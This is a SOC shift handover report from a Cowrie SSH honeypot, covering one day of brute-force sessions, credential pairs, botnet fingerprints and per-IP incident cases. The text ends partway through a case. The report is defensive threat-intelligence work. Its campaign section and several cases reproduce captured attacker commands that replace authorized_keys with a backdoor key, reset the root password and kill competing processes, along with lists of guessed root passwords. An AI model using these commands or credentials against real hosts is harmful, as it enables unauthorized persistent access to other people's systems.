# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-05-16 |
| **Generated At** | 2026-05-16T19:11:03Z |
| **Shift Time** | 19:11 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **424** |
| Confirmed Threats | **413** |
| False Positives Filtered | **11** (2.6%) |
| Unique Attacker IPs | **41** |
| Countries of Origin | **19** |
| High Severity Cases | **55** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **369** |
| Malware Samples Analyzed | **0** HIGH · **16** MED · 4 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **83** |
| Unique Credential Pairs | **34** |
| Unique Usernames | **6** |
| Unique Passwords | **34** |
| Successful Auth Pairs | **42** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 55 |
| `345gs5662d34` | 24 |
| `amssys` | 1 |
| `ubuntu` | 1 |
| `alumno` | 1 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `3245gs5662d34` | 26 |
| `345gs5662d34` | 24 |
| `20192019` | 2 |
| `Password@123` | 1 |
| `Admin@2022` | 1 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `root` | `3245gs5662d34` | 26 |
| `345gs5662d34` | `345gs5662d34` | 24 |
| `root` | `20192019` | 2 |
| `root` | `Password@123` | 1 |
| `root` | `Admin@2022` | 1 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `Password@123` | `14.29.176.8` | 2026-05-16T17:01:44 |
| `root` | `3245gs5662d34` | `14.29.176.8` | 2026-05-16T17:01:51 |
| `root` | `Admin@2022` | `101.36.122.139` | 2026-05-16T17:01:54 |
| `root` | `3245gs5662d34` | `101.36.122.139` | 2026-05-16T17:01:58 |
| `root` | `qweasdzxc123` | `101.36.122.139` | 2026-05-16T17:03:14 |
| `root` | `sit` | `14.103.112.42` | 2026-05-16T17:04:29 |
| `root` | `Test1234!` | `101.36.122.139` | 2026-05-16T17:04:29 |
| `root` | `A123456A` | `101.36.122.139` | 2026-05-16T17:05:45 |
| `root` | `Bd123456` | `14.29.176.8` | 2026-05-16T17:06:57 |
| `root` | `Qwerty@12345` | `101.36.122.139` | 2026-05-16T17:07:04 |
| `root` | `Pa$$w0rd@2024` | `101.36.122.139` | 2026-05-16T17:08:27 |
| `root` | `Hr123456` | `101.36.122.139` | 2026-05-16T17:11:11 |
| `root` | `QWER1234qwer` | `101.36.122.139` | 2026-05-16T17:15:10 |
| `root` | `localhost` | `101.36.122.139` | 2026-05-16T17:16:28 |
| `root` | `20192019` | `101.36.122.139` | 2026-05-16T17:17:44 |
| `root` | `warnightkardesim` | `101.36.122.139` | 2026-05-16T17:19:02 |
| `root` | `khongaibiet` | `101.36.122.139` | 2026-05-16T17:20:25 |
| `root` | `india@123` | `101.36.122.139` | 2026-05-16T17:23:05 |
| `root` | `Winter@123` | `120.196.66.80` | 2026-05-16T17:37:30 |
| `root` | `root123!` | `172.191.239.155` | 2026-05-16T17:38:09 |
| `root` | `3245gs5662d34` | `172.191.239.155` | 2026-05-16T17:38:14 |
| `root` | `tencent` | `104.168.169.128` | 2026-05-16T17:39:09 |
| `root` | `3245gs5662d34` | `104.168.169.128` | 2026-05-16T17:39:15 |
| `root` | `252523` | `101.96.197.182` | 2026-05-16T17:41:50 |
| `root` | `20192019` | `103.63.108.25` | 2026-05-16T17:41:50 |
| `root` | `tiffany` | `106.13.48.156` | 2026-05-16T17:41:54 |
| `root` | `3245gs5662d34` | `103.63.108.25` | 2026-05-16T17:41:55 |
| `root` | `3245gs5662d34` | `106.13.48.156` | 2026-05-16T17:42:17 |
| `root` | `grigore` | `121.168.139.251` | 2026-05-16T17:53:06 |
| `root` | `3245gs5662d34` | `121.168.139.251` | 2026-05-16T17:53:09 |
| `root` | `Pass123@` | `112.219.104.42` | 2026-05-16T17:55:47 |
| `root` | `3245gs5662d34` | `112.219.104.42` | 2026-05-16T17:55:51 |
| `root` | `vmware123` | `102.88.137.213` | 2026-05-16T17:57:41 |
| `root` | `3245gs5662d34` | `102.88.137.213` | 2026-05-16T17:57:48 |
| `root` | `0.1234` | `92.175.80.209` | 2026-05-16T18:05:54 |
| `root` | `3245gs5662d34` | `92.175.80.209` | 2026-05-16T18:05:59 |
| `root` | `tomcat123` | `43.173.69.147` | 2026-05-16T18:07:07 |
| `root` | `3245gs5662d34` | `43.173.69.147` | 2026-05-16T18:07:13 |
| `root` | `Welcome123$` | `201.77.124.248` | 2026-05-16T18:07:33 |
| `root` | `3245gs5662d34` | `201.77.124.248` | 2026-05-16T18:07:40 |
| `root` | `bertha` | `81.28.167.30` | 2026-05-16T18:09:29 |
| `root` | `3245gs5662d34` | `81.28.167.30` | 2026-05-16T18:09:33 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **424** |
| Sessions with Fingerprint | **4** |
| Unique HASSH Fingerprints | **4** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 100 |
| Perl Net::SSH | 2 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `f555226df196...` | Mirai/variant | 84 | 13 |
| `03a80b21afa8...` | Modern SSH client | 13 | 5 |
| `3c0eaacec19b...` | Mirai/variant | 2 | 2 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `f555226df196...` | libssh | 84 | 13 | Mirai/variant |
| `03a80b21afa8...` | libssh | 13 | 5 | Modern SSH client |
| `95420f9d932d...` | libssh | 3 | 3 | — |
| `3c0eaacec19b...` | Perl Net::SSH | 2 | 2 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **2** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 3 | 3 | `T1021.004, T1078, T1083, T1082` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 26 | 13 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo "root:cwucIZy1A8RE"|chpasswd|bash
```
```
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
```
Source IPs: `14.103.112.42`, `120.196.66.80`, `101.96.197.182`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `102.88.137.213`, `43.173.69.147`, `112.219.104.42`, `14.29.176.8`, `106.13.48.156`, `172.191.239.155`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **41** |
| Unique ASNs | **32** |
| High-Risk ASNs | **22** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS213412` | ONYPHE SAS | 6 | HIGH |
| `AS38365` | Beijing Baidu Netcom Science and Technology Co., Ltd. | 3 | HIGH |
| `AS4811` | China Telecom (Group) | 2 | HIGH |
| `AS8075` | Microsoft Corporation | 2 | HIGH |
| `AS212604` | WiNet LLc | 1 | LOW |
| `AS208324` | Noor Al-Bedaya for General Trading, agricultural investments, Technical production and distribution, internet services, general services, Information technology and software Ltd | 1 | LOW |
| `AS215421` | LikeNet LLC | 1 | LOW |
| `AS132774` | Niss Internet services private limited | 1 | LOW |

---

---

## 🚨 Priority Cases — Immediate Attention (55)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-306370024359

| Field | Detail |
|---|---|
| **Source IP** | `14.29.176[.]8` |
| **First Seen** | 2026-05-16 17:01 |
| **Last Seen** | 2026-05-16 17:01 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-16 17:01:42` | `cowrie.session.connect` |
| `2026-05-16 17:01:42` | `cowrie.client.version` |
| `2026-05-16 17:01:42` | `cowrie.client.kex` |
| `2026-05-16 17:01:44` | `cowrie.login.success` |
| `2026-05-16 17:01:44` | `cowrie.session.params` |
| `2026-05-16 17:01:44` | `cowrie.command.input` |
| `2026-05-16 17:01:44` | `cowrie.command.failed` |
| `2026-05-16 17:01:45` | `cowrie.log.closed` |
| `2026-05-16 17:01:46` | `cowrie.session.params` |
| `2026-05-16 17:01:46` | `cowrie.command.input` |
| `2026-05-16 17:01:46` | `cowrie.session.file_download` |
| `2026-05-16 17:01:46` | `cowrie.log.closed` |
| `2026-05-16 17:01:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.29.176[.]8` to AbuseIPDB if not already reported
- [ ] Block `14.29.176[.]8` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2e77df6a85e2

| Field | Detail |
|---|---|
| **Source IP** | `14.29.176[.]8` |
| **First Seen** | 2026-05-16 17:01 |
| **Last Seen** | 2026-05-16 17:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-16 17:01:49` | `cowrie.session.connect` |
| `2026-05-16 17:01:49` | `cowrie.client.version` |
| `2026-05-16 17:01:50` | `cowrie.client.kex` |
| `2026-05-16 17:01:51` | `cowrie.login.success` |
| `2026-05-16 17:01:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.29.176[.]8` to AbuseIPDB if not already reported
- [ ] Block `14.29.176[.]8` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-06c87e1aaaa0

| Field | Detail |
|---|---|
| **Source IP** | `101.36.122[.]139` |
| **First Seen** | 2026-05-16 17:01 |
| **Last Seen** | 2026-05-16 17:01 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-16 17:01:54` | `cowrie.session.connect` |
| `2026-05-16 17:01:54` | `cowrie.client.version` |
| `2026-05-16 17:01:54` | `cowrie.client.kex` |
| `2026-05-16 17:01:54` | `cowrie.login.success` |
| `2026-05-16 17:01:55` | `cowrie.session.params` |
| `2026-05-16 17:01:55` | `cowrie.command.input` |
| `2026-05-16 17:01:55` | `cowrie.command.failed` |
| `2026-05-16 17:01:55` | `cowrie.log.closed` |
| `2026-05-16 17:01:55` | `cowrie.session.params` |
| `2026-05-16 17:01:55` | `cowrie.command.input` |
| `2026-05-16 17:01:55` | `cowrie.session.file_download` |
| `2026-05-16 17:01:55` | `cowrie.log.closed` |
| `2026-05-16 17:01:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.36.122[.]139` to AbuseIPDB if not already reported
- [ ] Block `101.36.122[.]139` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e1620d865044

| Field | Detail |
|---|---|
| **Source IP** | `101.36.122[.]139` |
| **First Seen** | 2026-05-16 17:01 |
| **Last Seen** | 2026-05-16 17:01 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-16 17:01:57` | `cowrie.session.connect` |
| `2026-05-16 17:01:57` | `cowrie.client.version` |
| `2026-05-16 17:01:57` | `cowrie.client.kex` |
| `2026-05-16 17:01:58` | `cowrie.login.success` |
| `2026-05-16 17:01:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.36.122[.]139` to AbuseIPDB if not already reported
- [ ] Block `101.36.122[.]139` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9962cacfdc21

| Field | Detail |
|---|---|
| **Source IP** | `101.36.122[.]139` |
| **First Seen** | 2026-05-16 17:03 |
| **Last Seen** | 2026-05-16 17:03 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-16 17:03:13` | `cowrie.session.connect` |
| `2026-05-16 17:03:13` | `cowrie.client.version` |
| `2026-05-16 17:03:13` | `cowrie.client.kex` |
| `2026-05-16 17:03:14` | `cowrie.login.success` |
| `2026-05-16 17:03:14` | `cowrie.session.params` |
| `2026-05-16 17:03:14` | `cowrie.command.input` |
| `2026-05-16 17:03:14` | `cowrie.command.failed` |
| `2026-05-16 17:03:14` | `cowrie.log.closed` |
| `2026-05-16 17:03:14` | `cowrie.session.params` |
| `2026-05-16 17:03:14` | `cowrie.command.input` |
| `2026-05-16 17:03:14` | `cowrie.session.file_download` |
| `2026-05-16 17:03:14` | `cowrie.log.closed` |
| `2026-05-16 17:03:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.36.122[.]139` to AbuseIPDB if not already reported
- [ ] Block `101.36.122[.]139` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9f9ee849742f

| Field | Detail |
|---|---|
| **Source IP** | `101.36.122[.]139` |
| **First Seen** | 2026-05-16 17:03 |
| **Last Seen** | 2026-05-16 17:03 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-16 17:03:16` | `cowrie.session.connect` |
| `2026-05-16 17:03:16` | `cowrie.client.version` |
| `2026-05-16 17:03:16` | `cowrie.client.kex` |
| `2026-05-16 17:03:17` | `cowrie.login.success` |
| `2026-05-16 17:03:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.36.122[.]139` to AbuseIPDB if not already reported
- [ ] Block `101.36.122[.]139` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5a093ed2fb65

| Field | Detail |
|---|---|
| **Source IP** | `14.103.112[.]42` |
| **First Seen** | 2026-05-16 17:04 |
| **Last Seen** | 2026-05-16 17:05 |
| **Session Duration** | 33s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:cwucIZy1A8RE"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-16 17:04:28` | `cowrie.session.connect` |
| `2026-05-16 17:04:28` | `cowrie.client.version` |
| `2026-05-16 17:04:28` | `cowrie.client.kex` |
| `2026-05-16 17:04:29` | `cowrie.login.success` |
| `2026-05-16 17:04:29` | `cowrie.session.params` |
| `2026-05-16 17:04:29` | `cowrie.command.input` |
| `2026-05-16 17:04:29` | `cowrie.command.failed` |
| `2026-05-16 17:04:30` | `cowrie.log.closed` |
| `2026-05-16 17:04:31` | `cowrie.session.params` |
| `2026-05-16 17:04:31` | `cowrie.command.input` |
| `2026-05-16 17:04:32` | `cowrie.session.file_download` |
| `2026-05-16 17:04:32` | `cowrie.log.closed` |
| `2026-05-16 17:04:49` | `cowrie.session.params` |
| `2026-05-16 17:04:49` | `cowrie.command.input` |
| `2026-05-16 17:04:51` | `cowrie.log.closed` |
| `2026-05-16 17:04:51` | `cowrie.session.params` |
| `2026-05-16 17:04:51` | `cowrie.command.input` |
| `2026-05-16 17:04:52` | `cowrie.log.closed` |
| `2026-05-16 17:04:52` | `cowrie.session.params` |
| `2026-05-16 17:04:52` | `cowrie.command.input` |
| `2026-05-16 17:04:53` | `cowrie.session.file_download` |
| `2026-05-16 17:04:53` | `cowrie.log.closed` |
| `2026-05-16 17:04:54` | `cowrie.session.params` |
| `2026-05-16 17:04:54` | `cowrie.command.input` |
| `2026-05-16 17:04:54` | `cowrie.log.closed` |
| `2026-05-16 17:04:55` | `cowrie.session.params` |
| `2026-05-16 17:04:55` | `cowrie.command.input` |
| `2026-05-16 17:04:55` | `cowrie.log.closed` |
| `2026-05-16 17:04:55` | `cowrie.session.params` |
| `2026-05-16 17:04:55` | `cowrie.command.input` |
| `2026-05-16 17:04:55` | `cowrie.command.input` |
| `2026-05-16 17:04:56` | `cowrie.log.closed` |
| `2026-05-16 17:04:56` | `cowrie.session.params` |
| `2026-05-16 17:04:56` | `cowrie.command.input` |
| `2026-05-16 17:04:56` | `cowrie.log.closed` |
| `2026-05-16 17:04:56` | `cowrie.session.params` |
| `2026-05-16 17:04:56` | `cowrie.command.input` |
| `2026-05-16 17:04:57` | `cowrie.log.closed` |
| `2026-05-16 17:04:57` | `cowrie.session.params` |
| `2026-05-16 17:04:57` | `cowrie.command.input` |
| `2026-05-16 17:04:57` | `cowrie.log.closed` |
| `2026-05-16 17:04:57` | `cowrie.session.params` |
| `2026-05-16 17:04:57` | `cowrie.command.input` |
| `2026-05-16 17:04:57` | `cowrie.log.closed` |
| `2026-05-16 17:04:58` | `cowrie.session.params` |
| `2026-05-16 17:04:58` | `cowrie.command.input` |
| `2026-05-16 17:04:58` | `cowrie.log.closed` |
| `2026-05-16 17:04:58` | `cowrie.session.params` |
| `2026-05-16 17:04:58` | `cowrie.command.input` |
| `2026-05-16 17:04:59` | `cowrie.log.closed` |
| `2026-05-16 17:04:59` | `cowrie.session.params` |
| `2026-05-16 17:04:59` | `cowrie.command.input` |
| `2026-05-16 17:05:00` | `cowrie.log.closed` |
| `2026-05-16 17:05:00` | `cowrie.session.params` |
| `2026-05-16 17:05:00` | `cowrie.command.input` |
| `2026-05-16 17:05:00` | `cowrie.log.closed` |
| `2026-05-16 17:05:00` | `cowrie.session.params` |
| `2026-05-16 17:05:00` | `cowrie.command.input` |
| `2026-05-16 17:05:00` | `cowrie.log.closed` |
| `2026-05-16 17:05:01` | `cowrie.session.params` |
| `2026-05-16 17:05:01` | `cowrie.command.input` |
| `2026-05-16 17:05:01` | `cowrie.log.closed` |
| `2026-05-16 17:05:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.112[.]42` to AbuseIPDB if not already reported
- [ ] Block `14.103.112[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-103d97f67a47

| Field | Detail |
|---|---|
| **Source IP** | `101.36.122[.]139` |
| **First Seen** | 2026-05-16 17:04 |
| **Last Seen** | 2026-05-16 17:04 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-16 17:04:29` | `cowrie.session.connect` |
| `2026-05-16 17:04:29` | `cowrie.client.version` |
| `2026-05-16 17:04:29` | `cowrie.client.kex` |
| `2026-05-16 17:04:29` | `cowrie.login.success` |
| `2026-05-16 17:04:30` | `cowrie.session.params` |
| `2026-05-16 17:04:30` | `cowrie.command.input` |
| `2026-05-16 17:04:30` | `cowrie.command.failed` |
| `2026-05-16 17:04:30` | `cowrie.log.closed` |
| `2026-05-16 17:04:30` | `cowrie.session.params` |
| `2026-05-16 17:04:30` | `cowrie.command.input` |
| `2026-05-16 17:04:30` | `cowrie.session.file_download` |
| `2026-05-16 17:04:30` | `cowrie.log.closed` |
| `2026-05-16 17:04:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.36.122[.]139` to AbuseIPDB if not already reported
- [ ] Block `101.36.122[.]139` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e64cd8c1d581

| Field | Detail |
|---|---|
| **Source IP** | `101.36.122[.]139` |
| **First Seen** | 2026-05-16 17:04 |
| **Last Seen** | 2026-05-16 17:04 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-16 17:04:32` | `cowrie.session.connect` |
| `2026-05-16 17:04:32` | `cowrie.client.version` |
| `2026-05-16 17:04:32` | `cowrie.client.kex` |
| `2026-05-16 17:04:33` | `cowrie.login.success` |
